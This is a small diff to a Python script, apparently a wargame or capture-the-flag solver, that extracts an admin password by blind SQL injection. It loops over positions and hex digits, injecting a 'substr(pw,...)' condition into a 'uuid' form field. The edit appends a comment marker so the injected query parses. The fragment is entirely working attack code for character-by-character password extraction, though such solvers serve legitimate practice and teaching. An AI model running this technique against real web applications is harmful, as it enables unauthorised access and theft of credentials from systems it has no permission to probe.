@@ -58,7 +58,7 @@ hx = [hex(i)[2:] for i in range(16)]
 pw = ''
 for i in range(32):
     for j in range(16):
-        data['uuid']=f'admin\' and substr(pw,{str(i+1)},1)="{hx[j]}"
+        data['uuid']=f'admin\' and substr(pw,{str(i+1)},1)="{hx[j]}" #' 
         res = requests.post(url, data=data, cookies=cookies)
         if res.text.find('Wrong password!') > 0:
             pw += hx[j]
